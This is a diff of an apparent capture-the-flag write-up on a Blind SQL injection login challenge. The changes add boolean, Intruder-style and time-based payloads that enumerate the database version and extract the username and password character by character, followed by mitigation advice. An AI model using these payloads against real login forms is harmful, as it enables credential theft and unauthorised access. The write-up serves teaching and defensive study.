@@ -42,39 +42,37 @@ III. Exploitation
     ~~~
     Payload3: ' OR (SELECT CASE WHEN SUBSTRING(@@version,1,1)='1' THEN 1=1 ELSE 1=2 END)# //Enumerates DB version
     ~~~
-    **Enumerating Length of the 1st username**
+    **Enumerating Length of the 1st username:**
     ~~~
     Payload4: ' OR LENGTH(username)=5# // Enums length of username
    
     Payload5: ' OR LENGTH(password)=5# // Enums length of password
     ~~~
+    **Enumerating the user/pass:**
+    ~~~
+    Payload6:' OR (SELECT CASE WHEN SUBSTRING(username,§1§,1)='§a§' THEN 1=1 ELSE 1=2 END)#//
+    Payload7:' OR (SELECT CASE WHEN SUBSTRING(password,§1§,1)='§a§' THEN 1=1 ELSE 1=2 END)#//
+    ~~~  
     
-    
-    
-    
-    
-    You can also try UNION SELECT but I decided to stick with boolean payloads as they are my favorite.
-    ```
+   **Other Avenues for exploiting VIA TIME BASED AND UNION SELECT:**
+    ~~~
     Payload: ' OR (UNION SELECT NULL#) // This also doesn't give us an error but adding a second NULL value errors   
     
-    ```
+    Payload: ' OR (SELECT CASE WHEN SUBSTRING(password,1,1)='k' THEN sleep(10) ELSE 1=2 END)# //induces sleep if 
+    condition is true. This would be better if the default login creds message was standard
+    ~~~
     
 
-    
-    
-    
-    
-    
     
     
 
 IV. Flag Retrieval
 
-    Determine the structure of the database and the relevant tables/columns that might contain the flag
-    Use SQL commands to extract the flag value
-    Double-check that you've extracted the correct flag value
+    After you have retrieved the username/password you are able to login and are presented with a flag. 
 
-V. Conclusion
+V. Conclusion/Mitigation
 
-    Summarize the steps taken to successfully complete the Blind SQLi challenge
-    Reflect on the skills and tools used and what could be improved in future challenges.
+    In summary I was able to use Blind SQLi to enumerate database contents and gain credentials to an admins account.
+    For mitigation I would sanitize user input before passing it to the database and use parameterized queries. I would also give a single 
+    generic message when trying to login like "unknown login credentials" instead of "Unknown Username" and "Invalid password". Even if SQLi
+    wasn't present the ungeneric error messages would lead to username enumeration.
